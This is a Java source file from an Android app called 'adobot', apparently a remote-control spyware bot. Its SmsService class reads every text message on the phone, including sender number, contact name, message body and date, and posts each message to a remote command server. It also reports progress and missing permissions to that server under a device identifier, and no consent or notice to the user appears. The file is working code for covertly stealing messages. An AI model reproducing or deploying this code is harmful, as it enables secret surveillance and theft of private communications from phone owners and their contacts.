package buddy.ap.com.adobot;

import android.Manifest;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.content.ContextCompat;
import android.util.Log;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.HashMap;

import http.Http;
import io.socket.client.Socket;

public class SmsService extends Thread implements Runnable {

    private static String TAG = "SmsService";

    public static final String POSTURL = "/message";
    Client client;
    Socket socket;
    int numsms;

    public SmsService(Client client, int numsms) {
        this.client = client;
        this.socket = client.getSocket();
        this.numsms = numsms;
    }

    @Override
    public void run() {
        Log.i(TAG, "Running SmsService ......\n");
        getAllSms();
    }

    private void getAllSms() {
        Log.i(TAG, "Getting all sms");

        if(ContextCompat.checkSelfPermission(client, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {

            HashMap start = new HashMap();
            start.put("event", "getmessages:started");
            start.put("uid", client.getUid());
            start.put("device", client.getDevice());
            Http req = new Http();
            req.setUrl(client.SERVER + "/notify");
            req.setMethod("POST");
            req.setParams(start);
            req.execute();

            Uri callUri = Uri.parse("content://sms");
            ContentResolver cr = client.getApplicationContext().getContentResolver();
            Cursor mCur = cr.query(callUri, null, null, null, null);
            if (mCur.moveToFirst()) {
                do {

                    SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
                    Calendar calendar = Calendar.getInstance();
                    String now = mCur.getString(mCur.getColumnIndex("date"));
                    calendar.setTimeInMillis(Long.parseLong(now));

                    try {
                        String thread_id = mCur.getString(mCur.getColumnIndex("thread_id"));
                        String id = mCur.getString(mCur.getColumnIndex("_id"));
                        String phone = mCur.getString(mCur.getColumnIndex("address"));
                        String name = client.getContactName(client.getApplicationContext(), phone);
                        String body = mCur.getString(mCur.getColumnIndex("body"));
                        String date = formatter.format(calendar.getTime());
                        String type = mCur.getString(mCur.getColumnIndex("type"));

                        HashMap p = new HashMap();
                        p.put("uid", client.getUid());
                        p.put("type", type);
                        p.put("message_id", id);
                        p.put("thread_id", thread_id);
                        p.put("phone", phone);
                        p.put("name", name);
                        p.put("message", body);
                        p.put("date", date);

                        JSONObject obj = new JSONObject(p);
                        Log.i(TAG, obj.toString());

                        Http smsHttp = new Http();
                        smsHttp.setMethod("POST");
                        smsHttp.setUrl(client.SERVER + POSTURL);
                        smsHttp.setParams(p);
                        smsHttp.execute();

                    } catch (Exception e) {
                        e.printStackTrace();
                    }

                    this.numsms --;
                    Log.i(TAG, "numsms: " + this.numsms);

                } while (mCur.moveToNext() && this.numsms > 0);
            } else {

                HashMap done = new HashMap();
                done.put("event", "getmessages:empty");
                done.put("uid", client.getUid());
                done.put("device", client.getDevice());
                Http doneSMS = new Http();
                doneSMS.setUrl(client.SERVER + "/notify");
                doneSMS.setMethod("POST");
                doneSMS.setParams(done);
                doneSMS.execute();

            }

            HashMap done = new HashMap();
            done.put("event", "getmessages:done");
            done.put("uid", client.getUid());
            done.put("device", client.getDevice());
            Http doneSMS = new Http();
            doneSMS.setUrl(client.SERVER + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(done);
            doneSMS.execute();

            mCur.close();
        } else {
            Log.i(TAG, "No SMS permission!!!");
            HashMap noPermit = new HashMap();
            noPermit.put("event", "nopermission");
            noPermit.put("uid", client.getUid());
            noPermit.put("device", client.getDevice());
            noPermit.put("permission", "READ_SMS");
            Http doneSMS = new Http();
            doneSMS.setUrl(client.SERVER + "/notify");
            doneSMS.setMethod("POST");
            doneSMS.setParams(noPermit);
            doneSMS.execute();
        }
    }

}
